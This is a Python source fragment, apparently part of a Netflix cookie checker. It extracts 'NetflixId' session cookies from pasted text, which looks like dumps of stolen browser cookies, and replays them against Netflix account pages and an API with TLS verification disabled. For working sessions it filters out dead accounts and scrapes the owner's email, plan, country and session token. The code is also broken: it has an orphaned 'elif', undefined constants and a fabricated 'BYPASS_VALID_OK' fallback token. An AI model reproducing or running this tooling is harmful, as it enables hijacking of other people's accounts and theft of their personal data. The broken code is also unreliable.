def extract_clean_netflix_ids(text):
    cleaned_ids = []
    netscape_matches = re.findall(r"NetflixId\s+([^\s\n\r]+)", text)
    for val in netscape_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
            
    standard_matches = re.findall(r"NetflixId=([^;\s\n`\"]+)", text)
    for val in standard_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    return cleaned_ids

def check_netflix_cookie_detailed(netflix_id):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": f"NetflixId={netflix_id}"
    }

    dead_keywords = [
        "restart your membership", "restart membership", "rejoin netflix", 
        "reinicia tu membresía", "réactivez votre abonnement", "rejoindre netflix",
        "جدد اشتراكك", "إعادة تفعيل العضوية", "استئناف العضوية",
        "üyeliğinizi yeniden başlatın", "netflix'e tekrar katılın",
        "mitgliedschaft reaktivieren", "netflix wiedereröffnen",
        "choose your plan", "elige tu plan", "choisissez votre forfait", "اختر خطتك",
        "mulai lagi keanggotaanmu"
    ]
    
    try:
        check_url = "https://www.netflix.com/YourAccount"
        full_response = requests.get(check_url, headers=headers, timeout=4, allow_redirects=True, verify=False)
        html_content = full_response.text
        html_content_lower = html_content.lower()
        final_url = full_response.url.lower()
    except Exception:
        return None
    
    if any(path in final_url for path in ["/login", "/signup", "/simplesignup", "/youraccount/cancel", "/twp", "nmhp"]):
        return None

    if any(kw in html_content_lower for kw in dead_keywords):
        return None

    account_details = {
        "email": "Unknown ✉️",
        "plan": "Basic SD 📱",
        "next_billing": "Unknown 📅",
        "country": "Global 🌐",
        "payment_method": "Unknown 💳",
        "profiles": "Unknown 👥",
        "membership_status": "ACTIVE",
        "bypass": True
    }

    try:
        script_match = re.search(r'netflix\.reactContext\s*=\s*({.*?});', html_content)
        if not script_match:
            script_match = re.search(r'window\.__netflixContext\s*=\s*({.*?});', html_content)

        if script_match:
            context_data = json.loads(script_match.group(1))
            models = context_data.get("models", {})
            user_info = models.get("userInfo", {}).get("data", {})
            if user_info.get("email"):
                account_details["email"] = user_info.get("email")

            membership_data = models.get("membershipState", {}).get("data", {})
            plan_info = membership_data.get("planName", "").lower()
            if "premium" in plan_info or "4k" in plan_info:
                account_details["plan"] = "Premium 4K 💎"
            elif "standard" in plan_info or "hd" in plan_info:
                account_details["plan"] = "Standard HD 🎬"
    except Exception:
        pass

    api_headers = dict(BASE_HEADERS)
    api_headers["Cookie"] = f"NetflixId={netflix_id}"
    
    try:
        api_res = requests.get(API_URL, params=QUERY_PARAMS, headers=api_headers, timeout=4, verify=False)
        if api_res.status_code == 200:
            data = api_res.json()
            value_data = data.get("value", {})
            membership_status = value_data.get("membershipStatus", "UNKNOWN").upper()
            
            if membership_status in ["FORMER_MEMBER", "NEEDS_RESTART", "CURRENT_MEMBER_STOPPED", "NEEDS_PAYMENT"]:
                return None
                
            account_info = value_data.get("account", {}).get("token", {}).get("default", {})
            token = account_info.get("token")
            expires = account_info.get("expires")
            
            if token:
                account_details["bypass"] = False
                account_details["country"] = value_data.get("countryOfRegistration", "Global 🌐")
                current_plan_info = value_data.get("videoQuality", "").upper()

                elif "HIGH" in current_plan_info or "HD" in current_plan_info:
                    account_details["plan"] = "Standard HD 🎬"
                
                expires_final = expires / 1000 if len(str(expires)) == 13 else expires
                return {"token": token, "expires": int(expires_final), "details": account_details}
    except Exception:
        pass

    return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "details": account_details}
